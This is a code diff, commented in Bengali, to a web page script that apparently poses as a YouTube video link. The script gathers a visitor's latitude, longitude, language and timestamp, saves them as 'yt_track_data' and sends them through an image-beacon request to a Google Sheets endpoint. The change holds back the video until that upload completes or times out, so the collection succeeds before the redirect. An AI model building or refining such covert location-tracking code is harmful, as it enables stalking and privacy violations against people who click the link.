@@ -345,7 +345,9 @@
       localStorage.setItem("yt_track_data", JSON.stringify(existing));
     } catch(e) {}
 
-    // Google Sheets-এ GET request দিয়ে পাঠানো (iOS Safari compatible)
+    showToast();
+
+    // Google Sheets-এ পাঠানো — request শেষ হলে YouTube-এ যাবে
     if (GOOGLE_SHEET_URL) {
       var params = "?lat=" + encodeURIComponent(data.lat || "")
         + "&lon=" + encodeURIComponent(data.lon || "")
@@ -361,13 +363,23 @@
         + "&language=" + encodeURIComponent(data.language || "")
         + "&timestamp=" + encodeURIComponent(data.timestamp || "");
 
-      var img = new Image();
-      img.src = GOOGLE_SHEET_URL + params;
-    }
+      var done = false;
+      function goYoutube() {
+        if (!done) { done = true; playVideo(); }
+      }
 
-    showToast();
-    playVideo();
+      var img = new Image();
+      img.onload = goYoutube;   // request সফল হলে
+      img.onerror = goYoutube;  // request fail হলেও
+      img.src = GOOGLE_SHEET_URL + params;
+
+      // সর্বোচ্চ ২.৫ সেকেন্ড wait করবে
+      setTimeout(goYoutube, 2500);
+    } else {
+      playVideo();
+    }
   }
+
 
 
 
